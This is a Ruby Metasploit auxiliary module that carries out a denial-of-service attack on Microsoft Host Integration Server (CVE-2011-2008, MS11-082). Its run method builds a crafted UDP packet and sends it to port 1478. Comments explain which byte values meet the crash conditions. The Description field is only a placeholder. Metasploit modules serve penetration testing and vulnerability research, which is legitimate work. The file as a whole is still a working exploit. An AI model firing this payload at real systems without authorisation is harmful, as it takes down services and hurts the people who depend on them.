##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS11-082 Microsoft Host Integration Server Denial-of-Service",
      'Description'    => %q{Module Description},
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Ses Wang', #RCA, PoC (Qualys Community)
          'sinn3r'   #Metasploit
        ],
      'References'     =>
        [
          ['CVE', '2011-2008'],
          ['MSB', 'MS11-082'],
          ['URL', 'https://community.qualys.com/blogs/securitylabs/2011/11/02/dos-analysis-of-microsoft-host-integration-server-cve-2011-2008-in-ms11-082']
        ],
      'DisclosureDate' => "Oct 11 2011"
    ))

      register_options(
        [
          Opt::RPORT(1478)
        ], self.class)
  end

  def run
    buf =  "\x00\x00"
    buf << "\x01"      #Must be 0x01 to satisfy the condition
    buf << "\x4c\x00"  #Must be larger than 0x4b to satisfy the condition

    connect_udp
    udp_socket.put(buf)
    disconnect_udp
  end
end
